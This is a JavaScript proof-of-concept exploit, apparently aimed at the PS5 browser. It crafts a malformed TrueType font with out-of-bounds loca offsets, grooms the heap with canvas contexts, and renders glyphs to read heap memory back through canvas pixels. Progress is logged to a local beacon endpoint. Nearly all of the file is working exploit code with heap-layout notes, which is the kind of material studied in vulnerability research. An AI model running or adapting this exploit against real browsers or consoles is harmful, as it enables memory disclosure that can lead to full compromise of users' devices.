// p260 — FreeType OOB canvas info leak
// V180A confirmed: PS5 loads+renders fonts with OOB loca offsets
// Strategy: point loca entries past glyf into heap memory.
// FreeType reads heap data as glyph contour points.
// Render glyphs to canvas, read pixels back = heap data leak.
//
// Heap spray ArrayBuffers with marker data adjacent to font buffer.
// If OOB glyph reads our spray, pixels reveal marker values.
//
// Beacon prefix: V499-

(function() {
  function B(tag, body) {
    try {
      var url = '/beacon/V499-' + tag + '?t=' + Date.now();
      if (body) navigator.sendBeacon(url, body || '');
      else new Image().src = url;
    } catch(e) {}
  }

  function push16(arr, val) {
    arr.push((val >> 8) & 0xFF);
    arr.push(val & 0xFF);
  }
  function push32(arr, val) {
    arr.push((val >> 24) & 0xFF);
    arr.push((val >> 16) & 0xFF);
    arr.push((val >> 8) & 0xFF);
    arr.push(val & 0xFF);
  }
  function tag2u32(s) {
    return (s.charCodeAt(0) << 24) | (s.charCodeAt(1) << 16) |
           (s.charCodeAt(2) << 8) | s.charCodeAt(3);
  }
  function calcChecksum(data) {
    var sum = 0;
    var nLongs = Math.floor((data.length + 3) / 4);
    var padded = new Uint8Array(nLongs * 4);
    padded.set(data);
    var dv = new DataView(padded.buffer);
    for (var i = 0; i < nLongs; i++) sum = (sum + dv.getUint32(i * 4)) >>> 0;
    return sum;
  }

  B('BOOT');

  if (typeof FontFace === 'undefined') { B('NO-FONTFACE'); return; }

  // Phase A: Heap spray BEFORE font load
  // Spray ArrayBuffers with recognizable data that FreeType will
  // interpret as glyph contours if it reads OOB
  var SPRAY_SIZE = 4096;
  var SPRAY_COUNT = 0;
  var sprayBufs = [];
  for (var s = 0; s < SPRAY_COUNT; s++) {
    var ab = new ArrayBuffer(SPRAY_SIZE);
    var dv = new DataView(ab);
    // Fill with pattern that makes valid-ish TrueType glyph data:
    // First 2 bytes: numberOfContours = 1 (int16 big-endian)
    // Next 8 bytes: xMin, yMin, xMax, yMax (int16 each)
    // Then: endPtsOfContours[0] = 3 (4-point contour)
    // Then: instructionLength = 0
    // Then: flags for 4 points (ON_CURVE, short x/y deltas)
    // Then: x deltas, y deltas
    //
    // Actually we just fill with a distinctive pattern.
    // If FreeType reads this as glyph data, the contour shape
    // will depend on our marker values = info leak.
    for (var off = 0; off < SPRAY_SIZE; off += 4) {
      dv.setUint32(off, 0xDEAD0000 + (off & 0xFFFF));
    }
    sprayBufs.push(ab);
  }
  B('SPRAY-' + SPRAY_COUNT);

  // Phase B: Build TTF with OOB loca entries
  // numGlyphs = 16 (notdef + 15 OOB glyphs)
  // glyf table = 32 bytes (one valid .notdef with 0 contours)
  // loca entries for glyphs 1-15 point past glyf into heap

  var NUM_GLYPHS = 16;
  var GLYF_SIZE = 32;

  function buildOOBFont(oobOffset) {
    var tables = {};

    // head (54 bytes)
    tables.head = new Uint8Array(54);
    var hv = new DataView(tables.head.buffer);
    hv.setUint32(0, 0x00010000);
    hv.setUint32(4, 0x00005000);
    hv.setUint32(8, 0x00000000);
    hv.setUint32(12, 0x5F0F3CF5);
    hv.setUint16(16, 0x000B);
    hv.setUint16(18, 1000);
    hv.setInt16(36, -500);
    hv.setInt16(38, -500);
    hv.setInt16(40, 500);
    hv.setInt16(42, 500);
    hv.setUint16(44, 0);
    hv.setUint16(46, 8);
    hv.setInt16(48, 2);
    hv.setInt16(50, 1);  // indexToLocFormat = 1 (long offsets)
    hv.setInt16(52, 0);

    // maxp (32 bytes)
    tables.maxp = new Uint8Array(32);
    var mv = new DataView(tables.maxp.buffer);
    mv.setUint32(0, 0x00010000);
    mv.setUint16(4, NUM_GLYPHS);
    mv.setUint16(6, 64);   // maxPoints (generous)
    mv.setUint16(8, 4);    // maxContours
    mv.setUint16(14, 2);   // maxZones

    // hhea (36 bytes)
    tables.hhea = new Uint8Array(36);
    var hhv = new DataView(tables.hhea.buffer);
    hhv.setUint32(0, 0x00010000);
    hhv.setInt16(4, 800);
    hhv.setInt16(6, -200);
    hhv.setInt16(8, 0);
    hhv.setUint16(10, 600);
    hhv.setInt16(16, 600);
    hhv.setInt16(18, 1);
    hhv.setUint16(34, NUM_GLYPHS);

    // hmtx (NUM_GLYPHS * 4 bytes)
    tables.hmtx = new Uint8Array(NUM_GLYPHS * 4);
    var hmv = new DataView(tables.hmtx.buffer);
    for (var g = 0; g < NUM_GLYPHS; g++) {
      hmv.setUint16(g * 4, 600);
      hmv.setInt16(g * 4 + 2, 0);
    }

    // cmap: format 4, map A-O (0x41-0x4F) to glyphs 1-15
    var cmapData = [];
    push16(cmapData, 0); push16(cmapData, 1);
    push16(cmapData, 3); push16(cmapData, 1); push32(cmapData, 12);
    var segCount = 2;
    push16(cmapData, 4);
    push16(cmapData, 32);
    push16(cmapData, 0);
    push16(cmapData, segCount * 2);
    push16(cmapData, 4);
    push16(cmapData, 1);
    push16(cmapData, segCount * 2 - 4);
    push16(cmapData, 0x4F); // endCode: O
    push16(cmapData, 0xFFFF);
    push16(cmapData, 0);
    push16(cmapData, 0x41); // startCode: A
    push16(cmapData, 0xFFFF);
    push16(cmapData, (-0x40) & 0xFFFF); // idDelta: maps 0x41->1, 0x42->2, etc
    push16(cmapData, 1);
    push16(cmapData, 0);
    push16(cmapData, 0);
    tables.cmap = new Uint8Array(cmapData);

    // glyf: 32 bytes, just a .notdef with 0 contours
    tables.glyf = new Uint8Array(GLYF_SIZE);
    var gv = new DataView(tables.glyf.buffer);
    // .notdef glyph: numberOfContours = 0, bbox = 0
    gv.setInt16(0, 0);  // numberOfContours = 0
    gv.setInt16(2, 0);  // xMin
    gv.setInt16(4, 0);  // yMin
    gv.setInt16(6, 0);  // xMax
    gv.setInt16(8, 0);  // yMax
    // Rest is padding zeros

    // loca (long format): NUM_GLYPHS + 1 entries, 4 bytes each
    tables.loca = new Uint8Array((NUM_GLYPHS + 1) * 4);
    var lv = new DataView(tables.loca.buffer);
    lv.setUint32(0, 0);          // glyph 0 (.notdef) starts at 0
    lv.setUint32(4, GLYF_SIZE);  // glyph 0 ends / glyph 1 starts at GLYF_SIZE

    // Glyphs 1-15: each points to glyf + oobOffset + (i*256)
    // This reads 256 bytes of heap per glyph at increasing offsets
    for (var g = 1; g <= 15; g++) {
      var off = GLYF_SIZE + oobOffset + (g - 1) * 256;
      lv.setUint32(g * 4, off);
      lv.setUint32((g + 1) * 4, off + 256);
    }

    // post (32 bytes)
    tables.post = new Uint8Array(32);
    var pv = new DataView(tables.post.buffer);
    pv.setUint32(0, 0x00030000);
    pv.setInt16(8, -100);
    pv.setInt16(10, 50);

    // name
    var nameData = [];
    push16(nameData, 0); push16(nameData, 4);
    push16(nameData, 6 + 4 * 12);
    var nameStr = 'OOB' + oobOffset;
    var nameBytes = [];
    for (var i = 0; i < nameStr.length; i++) {
      nameBytes.push(0); nameBytes.push(nameStr.charCodeAt(i));
    }
    var nameIDs = [1, 2, 4, 6];
    for (var n = 0; n < nameIDs.length; n++) {
      push16(nameData, 3); push16(nameData, 1);
      push16(nameData, 0x0409); push16(nameData, nameIDs[n]);
      push16(nameData, nameBytes.length); push16(nameData, 0);
    }
    for (var i = 0; i < nameBytes.length; i++) nameData.push(nameBytes[i]);
    tables.name = new Uint8Array(nameData);

    // OS/2 (needed for some renderers)
    tables['OS/2'] = new Uint8Array(78);
    var ov = new DataView(tables['OS/2'].buffer);
    ov.setUint16(0, 1);     // version
    ov.setInt16(2, 500);    // xAvgCharWidth
    ov.setUint16(4, 400);   // usWeightClass
    ov.setUint16(6, 5);     // usWidthClass
    ov.setInt16(68, 800);   // sTypoAscender
    ov.setInt16(70, -200);  // sTypoDescender
    ov.setInt16(72, 0);     // sTypoLineGap

    // Assemble
    var tagList = Object.keys(tables).sort();
    var numTables = tagList.length;
    var headerSize = 12;
    var dirSize = numTables * 16;
    var offset = headerSize + dirSize;

    var tablePadded = {};
    var totalSize = offset;
    for (var i = 0; i < tagList.length; i++) {
      var t = tables[tagList[i]];
      var padLen = (4 - (t.length % 4)) % 4;
      var p = new Uint8Array(t.length + padLen);
      p.set(t);
      tablePadded[tagList[i]] = p;
      totalSize += p.length;
    }

    var buf = new ArrayBuffer(totalSize);
    var view = new DataView(buf);
    var u8 = new Uint8Array(buf);

    view.setUint32(0, 0x00010000);
    view.setUint16(4, numTables);
    var sr = 1; while (sr * 2 <= numTables) sr *= 2; sr *= 16;
    view.setUint16(6, sr);
    var es = 0; var tmp2 = sr / 16; while (tmp2 > 1) { tmp2 >>= 1; es++; }
    view.setUint16(8, es);
    view.setUint16(10, numTables * 16 - sr);

    var off = headerSize + dirSize;
    for (var i = 0; i < tagList.length; i++) {
      var tag = tagList[i];
      var raw = tables[tag];
      var padded = tablePadded[tag];
      var dirOff = headerSize + i * 16;
      view.setUint32(dirOff, tag2u32(tag));
      view.setUint32(dirOff + 4, calcChecksum(raw));
      view.setUint32(dirOff + 8, off);
      view.setUint32(dirOff + 12, raw.length);
      u8.set(padded, off);
      off += padded.length;
    }

    return buf;
  }

  B('FONT-BUILD-START');

  // ===== p498: data-URL font (SharedBuffer/VectorBufferMalloc = FastMalloc) =====
  // The p260 build above is reused unchanged; only the loading path changes:
  //   new FontFace(name, arrayBuffer) => Gigacage/AB heap
  //   new FontFace(name, 'url(data:font/ttf;base64,...)') => SharedBuffer/Vector
  //     (VectorBufferMalloc = FastMalloc, WTF/wtf/Forward.h:67)
  // Then allocate the target CanvasRenderingContext2D right after the font
  // buffer and read the context's State through the OOB glyph windows.

  function b64(ab) {
    var u = new Uint8Array(ab), s = '';
    for (var i = 0; i < u.length; i++) s += String.fromCharCode(u[i]);
    return btoa(s);
  }
  function tableEntryOffset(buf, tag) {
    var dv = new DataView(buf), n = dv.getUint16(4), off = 12;
    for (var i = 0; i < n; i++, off += 16) {
      var t = '';
      for (var j = 0; j < 4; j++) t += String.fromCharCode(dv.getUint8(off + j));
      if (t === tag) return off;
    }
    return -1;
  }
  function tableOffset(buf, tag) {
    var e = tableEntryOffset(buf, tag);
    return e < 0 ? -1 : new DataView(buf).getUint32(e + 8);
  }

  var GLYPH_CHARS = 'ABCDEFGHIJKLMNO';
  var FONT_NAME = 'FMFont' + (Date.now() & 0xffff);

  // Probe the table directory once to learn the glyf offset, then build the
  // real font with the OOB start chosen so glyph 3 lands at slotEnd.
  var probeBuf = buildOOBFont(0);
  var glyfOff = tableOffset(probeBuf, 'glyf');
  var SLOT = 768; // candidate libpas slot (context ~712, String/Vector class)
  var oobOffset = Math.max(0, SLOT - glyfOff - GLYF_SIZE - 512);
  var fontBuf = buildOOBFont(oobOffset);
  // Pad to 712 so the data-URL font's SharedBuffer/Vector allocation shares
  // the ~712-byte context class (otherwise the font is 680 -> a lower class).
  var TARGET_LEN = 712;
  if (fontBuf.byteLength < TARGET_LEN) {
    var padded = new Uint8Array(TARGET_LEN);
    padded.set(new Uint8Array(fontBuf));
    fontBuf = padded.buffer;
  }
  glyfOff = tableOffset(fontBuf, 'glyf');

  // ---- Tuner: in-bounds loca pointing at a crafted glyph header ----
  // Glyph 1 starts at the first padding byte (font data end). Its header is
  // VALID (numberOfContours=1, endPts=191, instructionLength=0); only the
  // first 18 flags live in the 712-byte buffer, so the remaining flags and
  // the x/y deltas are read straight out of the target contexts.
  // loca[1] is in-bounds; loca[2]=0x1000 and the declared glyf length is
  // enlarged to 0x1000 so a loca-bounds check (if present) still passes.
  var dvf = new DataView(fontBuf);
  var u8f = new Uint8Array(fontBuf);
  var fontDataLen = probeBuf.byteLength;
  var glyphStart = fontDataLen;
  var N = 192;
  dvf.setInt16(glyphStart, 1);              // numberOfContours
  dvf.setInt16(glyphStart + 2, 0);          // xMin
  dvf.setInt16(glyphStart + 4, 0);          // yMin
  dvf.setInt16(glyphStart + 6, 0);          // xMax
  dvf.setInt16(glyphStart + 8, 0);          // yMax
  dvf.setUint16(glyphStart + 10, N - 1);    // endPtsOfContours[0]
  dvf.setUint16(glyphStart + 12, 0);        // instructionLength
  for (var fi = 0; glyphStart + 14 + fi < TARGET_LEN; fi++)
    u8f[glyphStart + 14 + fi] = 0x01;       // 18 flags in the padding

  var locaOff = tableOffset(fontBuf, 'loca');
  dvf.setUint32(locaOff + 4, glyphStart - glyfOff);   // loca[1]
  for (var li = 2; li <= NUM_GLYPHS; li++)
    dvf.setUint32(locaOff + li * 4, 0x1000);           // loca[2..16]
  var glyfEntry = tableEntryOffset(fontBuf, 'glyf');
  dvf.setUint32(glyfEntry + 12, 0x1000);               // declared glyf length
  var maxpOff = tableOffset(fontBuf, 'maxp');
  dvf.setUint16(maxpOff + 6, 256);                     // maxPoints
  dvf.setUint16(maxpOff + 8, 4);                       // maxContours

  B('FONT', 'len=' + fontBuf.byteLength + ' glyf=0x' + glyfOff.toString(16) +
    ' glyphStart=0x' + glyphStart.toString(16) + ' N=' + N +
    ' loca1=0x' + (glyphStart - glyfOff).toString(16) + ' glyfLen=0x1000');

  var face = new FontFace(FONT_NAME, 'url(data:font/ttf;base64,' + b64(fontBuf) + ')');
  face.load().then(function (loaded) {
    document.fonts.add(loaded);
    B('LOADED');

    // Target contexts allocated AFTER the font buffer: same FastMalloc heap,
    // same ~712 class. Spray 16 so at least one lands in the OOB windows.
    // Their State is the differential oracle.
    var targets = [];
    for (var ti = 0; ti < 16; ti++) {
      var tc = document.createElement('canvas');
      tc.width = 8; tc.height = 8;
      var t = tc.getContext('2d');
      t.lineWidth = 777.25;
      t.miterLimit = 10;
      t.globalAlpha = 0.5;
      t.lineDashOffset = 3.5;
      t.lineCap = 'round';
      t.fillStyle = '#ff0000';
      t.strokeStyle = '#00ff00';
      targets.push(t);
    }
    B('TARGET', 'n=' + targets.length);

    var rc = document.createElement('canvas');
    rc.width = 200; rc.height = 200;
    var r = rc.getContext('2d');

    function scan(tag) {
      var out = [];
      for (var g = 0; g < GLYPH_CHARS.length; g++) {
        r.clearRect(0, 0, 200, 200);
        r.fillStyle = '#000000';
        r.fillRect(0, 0, 200, 200);
        r.fillStyle = '#ffffff';
        r.font = '120px ' + FONT_NAME;
        r.fillText(GLYPH_CHARS[g], 10, 150);
        var d = r.getImageData(0, 0, 200, 200).data;
        var white = 0, hash = 0, minX = 200, maxX = -1, minY = 200, maxY = -1;
        for (var p = 0; p < d.length; p += 4) {
          if (d[p] > 128) {
            var idx = p / 4, x = idx % 200, y = (idx / 200) | 0;
            white++;
            hash = ((hash * 31) + idx) >>> 0;
            if (x < minX) minX = x; if (x > maxX) maxX = x;
            if (y < minY) minY = y; if (y > maxY) maxY = y;
          }
        }
        out.push({ g: g, white: white, hash: hash });
        if (white > 5) B(tag + '-G' + g, 'w=' + white + ' h=' + (hash & 0xffff).toString(16) +
          ' box=' + minX + ',' + minY + ',' + maxX + ',' + maxY);
      }
      return out;
    }

    var base = scan('BASE');
    function setAll(fn) { for (var ti = 0; ti < targets.length; ti++) fn(targets[ti]); }
    function diff(name, setter) {
      setAll(setter);
      var cur = scan('D' + name);
      var changed = [];
      for (var g = 0; g < cur.length; g++)
        if (cur[g].hash !== base[g].hash || cur[g].white !== base[g].white) changed.push(g);
      B('DIFF-' + name, changed.length ? ('changed=' + changed.join(',')) : 'none');
      setAll(function (t) { t.lineWidth = 777.25; t.miterLimit = 10; t.globalAlpha = 0.5; t.lineDashOffset = 3.5; });
    }
    diff('LW', function (t) { t.lineWidth = 888.5; });
    diff('ML', function (t) { t.miterLimit = 20; });
    diff('GA', function (t) { t.globalAlpha = 0.75; });
    diff('LDO', function (t) { t.lineDashOffset = 7.5; });
    B('DONE');
  }).catch(function (e) {
    B('LOADERR', String(e && e.message).substring(0, 80));
  });
})();
